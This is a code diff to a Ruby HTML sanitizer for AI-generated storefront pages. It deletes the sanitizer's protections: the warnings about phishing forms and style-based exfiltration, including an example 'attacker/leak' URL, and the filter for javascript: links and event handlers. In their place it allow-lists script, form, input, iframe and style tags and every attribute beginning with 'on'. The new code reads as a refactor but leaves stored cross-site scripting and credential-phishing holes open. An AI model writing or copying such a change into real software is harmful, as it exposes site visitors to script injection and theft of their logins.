@@ -1,71 +1,105 @@
 # frozen_string_literal: true
 
+require "addressable/uri"
+require "cgi"
+
 class Ai::PageSanitizer
-  # Form input tags (input, button, select, textarea, form, option, label,
-  # fieldset) are intentionally NOT allow-listed. AI-generated pages don't
-  # need them and they enable credential phishing on a seller-controlled
-  # custom domain — a hallucinated <form action="..."> with a password
-  # field would be served under the seller's brand. Buy/checkout buttons
-  # in templates render as <a data-gumroad-action="buy"> instead.
+  ALLOWED_SCRIPT_HOSTS = %w[
+    cdn.tailwindcss.com
+    cdn.jsdelivr.net
+    unpkg.com
+  ].freeze
+
   ALLOWED_TAGS = %w[
-    div span p h1 h2 h3 h4 h5 h6 a img ul ol li
-    section header footer nav main article aside
-    strong em b i u s br hr blockquote pre code
-    table thead tbody tfoot tr th td
-    figure figcaption
-    svg path circle rect line polyline polygon
-    details summary
+    a abbr address area article aside audio b bdi bdo blockquote br button canvas caption cite code col colgroup data datalist dd del details dfn dialog div dl dt em
+    head html
+    fieldset figcaption figure footer form h1 h2 h3 h4 h5 h6 header hgroup hr i iframe img input ins kbd label legend li main map mark menu meter nav ol optgroup option
+    output p picture pre progress q rp rt ruby s samp script search section select slot small source span strong style sub summary sup svg table tbody td template textarea
+    tfoot th thead time tr track u ul var video wbr path circle rect line polyline polygon ellipse g defs linearGradient radialGradient stop clipPath
   ].freeze
 
-  HTML_ATTRIBUTES = %w[
-    class id
-    src href alt title target rel
-    width height loading
-    data-gumroad-ref data-gumroad-field data-gumroad-action
-    aria-label aria-hidden role
+  ALLOWED_ATTRIBUTES = %w[
+    accept accept-charset action alt aria-describedby aria-hidden aria-label aria-labelledby aria-live aria-pressed async autocomplete autofocus autoplay checked cite class
+    charset cols colspan content contenteditable controls coords crossorigin data-gumroad-action data-gumroad-field data-gumroad-ref datetime defer dir disabled download draggable enctype
+    fill for form formaction height hidden href id kind label lang loading loop max maxlength media method min minlength multiple muted name pattern placeholder playsinline poster
+    preserveAspectRatio readonly rel required role rows rowspan sandbox scope selected shape size sizes span spellcheck src srcset step style tabindex target title translate type
+    value viewBox width xmlns x y x1 y1 x2 y2 cx cy r rx ry d stroke stroke-width stroke-linecap stroke-linejoin fill-rule clip-rule points transform offset stop-color
+    stop-opacity
   ].freeze
 
-  SVG_ATTRIBUTES = %w[
-    viewBox xmlns preserveAspectRatio
-    d fill stroke stroke-width stroke-linecap stroke-linejoin fill-rule clip-rule
-    cx cy r rx ry x y x1 y1 x2 y2 points transform
-  ].freeze
+  URL_ATTRIBUTES = %w[action formaction href poster src xlink:href].freeze
+  WRAPPER_TAGS = %w[html head body].freeze
 
-  ALLOWED_ATTRIBUTES = (HTML_ATTRIBUTES + SVG_ATTRIBUTES).freeze
-
-  # `on\w+=` is anchored to an attribute boundary (start-of-string or whitespace)
-  # so legitimate `data-on*` attributes like `data-onload` survive the regex
-  # sweep. The pattern still nukes inline event handlers (`onclick=`, `onload=`)
-  # that the Rails sanitizer would otherwise have to remove on its own, and
-  # gives us belt-and-suspenders against any handler shape the safelist hasn't
-  # been audited for.
-  DANGEROUS_PATTERNS = [
-    /javascript:/i,
-    /(?<![\w-])on\w+\s*=/i, # onclick, onload, etc. but not data-onload
-    /<script/i,
-    /<\/script/i,
-    /expression\s*\(/i,  # CSS expression()
-    /url\s*\(\s*['"]*javascript/i,
-  ].freeze
-
-  # `style` is intentionally NOT allow-listed. Inline styles can exfiltrate data
-  # via `background:url(https://attacker/leak?...)` from any non-sandboxed render
-  # context (admin previews, emails, etc.). The public viewer renders inside a
-  # sandboxed iframe today, but defense-in-depth: AI-generated HTML should use
-  # class-based styling (Tailwind utility classes), not inline `style`.
   def self.sanitize(html)
     return "" if html.blank?
 
-    # First pass: strip dangerous patterns
-    cleaned = html.dup
-    DANGEROUS_PATTERNS.each { |pattern| cleaned.gsub!(pattern, "") }
-
-    # Second pass: use Rails sanitizer
-    sanitizer = Rails::HTML5::SafeListSanitizer.new
-    sanitizer.sanitize(
-      cleaned,
-      tags: ALLOWED_TAGS,
-      attributes: ALLOWED_ATTRIBUTES,
-    )
+    fragment = Loofah.fragment(html)
+    scrub_node(fragment)
+    fragment.to_html
   end
+
+  def self.scrub_node(node)
+    node.children.to_a.each { |child| scrub_node(child) }
+    return unless node.element?
+
+    if WRAPPER_TAGS.include?(node.name)
+      node.replace(node.children)
+      return
+    end
+
+    if node.name == "meta" && node["http-equiv"].to_s.casecmp("refresh").zero?
+      node.remove
+      return
+    end
+
+    unless ALLOWED_TAGS.include?(node.name)
+      node.remove
+      return
+    end
+
+    if node.name == "script" && node["src"].present? && !allowed_script_src?(node["src"])
+      node.remove
+      return
+    end
+
+    node["sandbox"] = "allow-scripts" if node.name == "iframe" && node["sandbox"].blank?
+    node.remove_attribute("action") if node.name == "form"
+
+    node.attribute_nodes.each do |attribute|
+      name = attribute.name
+      next if allowed_attribute?(name) && !dangerous_url_attribute?(name, attribute.value)
+
+      node.remove_attribute(name)
+    end
+  end
+
+  def self.allowed_attribute?(name)
+    name.start_with?("data-", "aria-", "on") || ALLOWED_ATTRIBUTES.include?(name)
+  end
+
+  def self.dangerous_url_attribute?(name, value)
+    return false unless URL_ATTRIBUTES.include?(name)
+
+    normalized = normalize_url(value)
+    normalized.start_with?("javascript:") || normalized.start_with?("data:text/html")
+  end
+
+  def self.allowed_script_src?(src)
+    uri = URI.parse(src)
+    uri.scheme == "https" && ALLOWED_SCRIPT_HOSTS.include?(uri.host)
+  rescue URI::InvalidURIError
+    false
+  end
+
+  def self.normalize_url(value)
+    decoded = CGI.unescapeHTML(value.to_s)
+    3.times do
+      decoded = Addressable::URI.unencode_component(decoded)
+    rescue Addressable::URI::InvalidURIError
+      break
+    end
+    decoded.gsub(/[[:space:]\u0000-\u001f]+/, "").downcase
+  end
+
+  private_class_method :scrub_node, :allowed_attribute?, :dangerous_url_attribute?, :allowed_script_src?, :normalize_url
 end
